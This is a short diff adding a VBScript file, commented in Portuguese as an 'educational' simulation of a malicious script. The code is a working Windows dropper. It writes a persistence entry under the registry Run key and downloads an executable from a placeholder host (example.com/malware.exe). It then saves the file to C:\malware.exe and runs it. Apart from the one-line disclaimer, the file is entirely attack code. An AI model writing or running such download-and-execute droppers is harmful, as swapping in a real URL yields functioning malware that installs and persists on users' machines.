@@ -1,0 +1,25 @@
+' Simulação de um script malicioso - Este é apenas um exemplo educativo!
+Dim WshShell
+Set WshShell = CreateObject("WScript.Shell")
+
+' Tenta alterar uma chave no Registro do Windows
+WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MalwareTest", "c:\windows\system32\notepad.exe"
+
+' Tenta baixar um arquivo da internet
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.Open "GET", "http://example.com/malware.exe", False
+objXMLHTTP.Send
+
+' Salva o arquivo baixado no sistema
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1 ' binário
+    objADOStream.Write objXMLHTTP.responseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile "C:\malware.exe", 2
+    objADOStream.Close
+End If
+
+' Executa o arquivo baixado
+WshShell.Run "C:\malware.exe"
